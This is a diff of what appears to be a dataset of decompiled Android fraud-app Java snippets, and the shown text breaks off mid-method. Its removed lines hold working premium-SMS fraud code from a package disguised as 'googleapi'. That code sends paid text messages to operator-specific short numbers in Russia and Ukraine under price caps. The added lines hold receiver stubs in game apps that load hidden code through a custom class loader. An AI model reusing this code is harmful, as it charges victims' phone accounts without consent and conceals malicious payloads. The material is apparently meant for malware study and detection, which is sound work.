@@ -2,904 +2,337 @@ Here is a batch of Android app java code snippets about Monetary_Fraud_and_Finan
 
 
 --- Start of snippet 1 ---
-Package Path:com.googleapi.cover.ActService.ActService
-Class Name:ActService
-Java Code: package com.googleapi.cover;
+Package Path:com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver
+Class Name:BillingReceiver
+Java Code: package com.auxbrain.zombie_highwayer;
 
-public class ActService extends Service {
-    private static final double MF_LIMIT = 350.0d;
-    private static final double MTS_LIMIT = 350.0d;
-    private static String PREF_TO_USE;
-    private static boolean isStarted;
-    private PowerManager.WakeLock wakeLock;
-    public static String NUM_10 = "9865";
-    public static String NUM_5 = "9864";
-    public static String NUM_3 = "9863";
-    public static String NUM_1 = "1627";
-    public static String PREF_PLAT = "6563352";
-    public static String PREF_A1 = "7987035";
-    public static String NUM_5_A1 = "7781";
-    public static String NUM_3_A1 = "1161";
-    public static String NUM_2_A1 = "1899";
-    public static String NUM_1_A1 = "1151";
-    public static String NUM_1_ALT_A1 = "1141";
-    public static String NUM_5_SD = "8612";
-    public static String NUM_4_SD = "8611";
-    public static String NUM_3_SD = "8610";
-    public static String NUM_2_SD = "8609";
-    public static String NUM_1_SD = "8608";
-    public static String NUM_1_ALT_SD = "8607";
-    public static String NUM_1_ALT_2_SD = "8606";
-    private static ArrayList<Pair<String, Double>> mfPrices = new ArrayList<>();
-    private static ArrayList<Pair<String, Double>> mtsPrices = new ArrayList<>();
+public class BillingReceiver extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
 
-    static {
-        mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)));
-        mfPrices.add(new Pair<>(NUM_4_SD, Double.valueOf(135.0d)));
-        mfPrices.add(new Pair<>(NUM_3_SD, Double.valueOf(100.0d)));
-        mfPrices.add(new Pair<>(NUM_2_SD, Double.valueOf(42.0d)));
-        mfPrices.add(new Pair<>(NUM_1_SD, Double.valueOf(30.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_SD, Double.valueOf(17.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_2_SD, Double.valueOf(3.39d)));
-        mtsPrices.add(new Pair<>(NUM_5_A1, Double.valueOf(203.2d)));
-        mtsPrices.add(new Pair<>(NUM_3_A1, Double.valueOf(111.76d)));
-        mtsPrices.add(new Pair<>(NUM_2_A1, Double.valueOf(74.51d)));
-        mtsPrices.add(new Pair<>(NUM_1_A1, Double.valueOf(42.34d)));
-        mtsPrices.add(new Pair<>(NUM_1_ALT_A1, Double.valueOf(27.09d)));
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
+        }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
     }
-
-    @Override // android.app.Service
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override // android.app.Service
-    public void onCreate() {
-        isStarted = false;
-        super.onCreate();
-    }
-
-    @Override // android.app.Service
-    public void onDestroy() {
-        super.onDestroy();
-        this.wakeLock.release();
-    }
-
-    @Override // android.app.Service, android.content.ComponentCallbacks
-    public void onLowMemory() {
-        super.onLowMemory();
-    }
-
-    @Override // android.app.Service
-    public void onStart(Intent intent, int startId) {
-        super.onStart(intent, startId);
-    }
-
-    @Override // android.app.Service, android.content.content.ComponentCallbacks
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!isStarted) {
-            Worker worker = new Worker(this, null);
-            worker.start();
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            current
+}
 --- End of snippet 1 ---
 
 
 --- Start of snippet 2 ---
-Package Path:com.googleapi.cover.ActService.Worker
-Class Name:ActService
-Java Code: package com.googleapi.cover;
+Package Path:com.auxbrain.zombie_highwayer.BillingReceiver.onReceive
+Class Name:BillingReceiver
+Java Code: package com.auxbrain.zombie_highwayer;
 
-    private class Worker extends Thread {
-        private Worker() {
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
         }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
         }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
         }
     }
 --- End of snippet 2 ---
 
 
 --- Start of snippet 3 ---
-Package Path:com.googleapi.cover.ActService.actUK
-Class Name:ActService
-Java Code: package com.googleapi.cover;
+Package Path:com.auxbrain.zombie_highwayer.R.Theme_FullScreen
+Class Name:R
+Java Code: package com.auxbrain.zombie_highwayer;
 
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
+        public static final int Theme_FullScreen = 0x7f040000;
 --- End of snippet 3 ---
 
 
 --- Start of snippet 4 ---
-Package Path:com.googleapi.cover.ActService.beginSending
-Class Name:ActService
-Java Code: package com.googleapi.cover;
+Package Path:com.slfloat.LMR.LMR
+Class Name:LMR
+Java Code: package com.slfloat;
 
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
         }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
+    }
+}
 --- End of snippet 4 ---
 
 
 --- Start of snippet 5 ---
-Package Path:com.googleapi.cover.ActService.performActions
-Class Name:ActService
-Java Code: package com.googleapi.cover;
+Package Path:com.slinsert.LMR.LMR
+Class Name:LMR
+Java Code: package com.slinsert;
 
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
